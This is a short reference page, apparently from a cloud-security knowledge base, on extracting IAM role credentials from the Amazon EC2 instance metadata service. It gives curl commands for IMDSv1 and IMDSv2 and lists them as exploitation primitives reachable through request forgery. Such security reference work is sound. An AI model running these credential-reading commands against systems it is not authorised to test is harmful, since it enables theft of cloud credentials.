# Amazon EC2

Amazon EC2 is one of the most popular services. It allows you to run vitrtual machines.


| Property      | Value                          |
| ----------- | ------------------------------------ |
| Credentials delivery mechanism       | [Served through link-local metadata service](../types.md#served-through-link-local-metadata-service)  |
| Protection type       | None (IMDSv1), or HTTP header requires a stateful session token (IMDSv2) |
| Exploitation primitives    | `Query arbitrary URL` (IMDSv1), `Query arbitrary URL` and `Perform HTTP requests with arbitrary method, URL and body` |

## Extracting credentials

### If IMDSv2 is not enforced

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials
```

This will return the name of the role attached to the EC2 instance, that you can use in a subsequent HTTP request to retrieve temporary credentials for the role:

```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/MyInstanceRole
```

### If IMDSv2 is enforced

```bash
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials
```

This will return the name of the role attached to the EC2 instance, that you can use in a subsequent HTTP request to retrieve temporary credentials for the role:

```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/MyInstanceRole
```

## References

- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html#instance-metadata-v2-how-it-works